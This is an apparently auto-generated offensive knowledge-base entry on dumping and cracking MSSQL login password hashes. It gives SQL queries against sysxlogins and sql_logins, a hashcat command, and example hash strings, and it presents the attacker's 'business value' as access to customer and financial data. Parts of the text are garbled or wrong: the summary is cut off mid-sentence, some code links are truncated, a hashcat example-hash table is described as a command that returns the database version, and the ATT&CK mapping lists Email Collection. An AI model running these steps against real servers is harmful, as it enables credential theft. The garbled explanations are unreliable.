---
id: 30aca0f6-947e-4171-a1bb-100ca29cb8df
name: MSSQL Server Password Retrieval and Cracking
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.137502+00:00'
updated_at: '2023-04-10T20:36:43.909339+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Brute Force|T1110 - Brute Force]]'
- '[[Email Collection|T1114 - Email Collection]]'
tags:
- '[[Manual SQL Server Queries]]'
- '[[MSSQL Accounts and Hashes]]'
- '[[MSSQL Server]]'
commands:
- '[[Extract MSSQL data]]'
- '[[Retrieve name and hashed password from sql_logins table in MSSQL 2005]]'
- '[[Retrieve name and hashed password from sysxlogins table in MSSQL 2000]]'
- '[[Retrieve name and password from sysxlogins table in MSSQL 2000]]'
- '[[Retrieve name and password hash from sql_logins table in MSSQL 2005]]'
---

# MSSQL Server Password Retrieval and Cracking

## Summary

This procedure is used to retrieve and crack MSSQL Server password hashes. Attackers can use this procedure to gain access to sensitive information stored in MSSQL databases. The procedure involves using manual SQL queries to extract password hashes from the MSSQL Server. These hashes can then be c

## Description

# Description

This procedure is used to retrieve and crack MSSQL Server password hashes. Attackers can use this procedure to gain access to sensitive information stored in MSSQL databases. The procedure involves using manual SQL queries to extract password hashes from the MSSQL Server. These hashes can then be cracked using tools like Hashcat to obtain the plaintext passwords.

From a technical perspective, this procedure involves querying the MSSQL Server to obtain the password hashes. The hashes are then extracted and saved in a file that can be used as input for Hashcat. The cracking process involves trying different combinations of passwords until a match is found.

The business value of this procedure is that it allows attackers to gain access to sensitive information stored in MSSQL databases, such as customer data or financial information.

 

## Requirements

1. Access to the MSSQL Server

1. Tools like Hashcat for cracking password hashes

 

## Defense

1. Ensure that strong passwords are used for MSSQL accounts

1. Implement two-factor authentication for MSSQL accounts

1. Monitor MSSQL Server logs for any suspicious activity

 

## Objectives

1. Retrieve MSSQL Server password hashes

1. Crack MSSQL Server password hashes to obtain plaintext passwords

 

# Instructions

1. To retrieve password hashes for MSSQL 2000, use the following queries:
1. SELECT name, password FROM master..sysxlogins
2. SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

To retrieve password hashes for MSSQL 2005, use the following queries:
1. SELECT name, password_hash FROM master.sys.sql_logins
2. SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins

 



**Code**: [[MSSQL 2000:
SELECT name, password FROM master..sys]]



> The above commands are used to retrieve password hashes for MSSQL databases. The first query retrieves the name and password for each user in the sysxlogins table for MSSQL 2000. The second query converts the password to a hexadecimal string. For MSSQL 2005, the first query retrieves the name and password hash for each user in the sql_logins table. The second query concatenates the name and password hash into a single string.



**Command** ([[Retrieve name and password from sysxlogins table in MSSQL 2000]]):

```bash
SELECT name, password FROM master..sysxlogins
```





**Command** ([[Retrieve name and hashed password from sysxlogins table in MSSQL 2000]]):

```bash
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```





**Command** ([[Retrieve name and password hash from sql_logins table in MSSQL 2005]]):

```bash
SELECT name, password_hash FROM master.sys.sql_logins
```





**Command** ([[Retrieve name and hashed password from sql_logins table in MSSQL 2005]]):

```bash
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```



2. To crack passwords for MS SQL database using Hashcat, run the above command with appropriate file paths and options. The -m option specifies the hash type, -a option specifies the attack mode, and --force option forces Hashcat to proceed with the cracking process even if the hash file is not recognized. Make sure to use a wordlist containing potential passwords.

 



**Code**: [[hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr]]



> -m: Hash type
-a: Attack mode
--force: Forces Hashcat to proceed with the cracking process even if the hash file is not recognized.

3. Use this command to determine the version of MSSQL database.

 



**Code**: [[131	MSSQL (2000)	0x0100270256050000000000000000000]]



> This command returns the version of MSSQL database in use. The output contains the version number along with the year of release. The version number is followed by a hexadecimal string that represents the build number of the database. This information can be useful for troubleshooting purposes or for ensuring compatibility with other software that relies on specific MSSQL versions.



**Command** ([[Extract MSSQL data]]):

```bash
131	MSSQL (2000)	0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
132	MSSQL (2005)	0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
1731	MSSQL (2012, 2014)	0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375
```



## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Brute Force|T1110 - Brute Force]]
- [[Email Collection|T1114 - Email Collection]]

## Commands Used

- [[Extract MSSQL data]]
- [[Retrieve name and hashed password from sql_logins table in MSSQL 2005]]
- [[Retrieve name and hashed password from sysxlogins table in MSSQL 2000]]
- [[Retrieve name and password from sysxlogins table in MSSQL 2000]]
- [[Retrieve name and password hash from sql_logins table in MSSQL 2005]]

## Tags

- [[Manual SQL Server Queries]]
- [[MSSQL Accounts and Hashes]]
- [[MSSQL Server]]


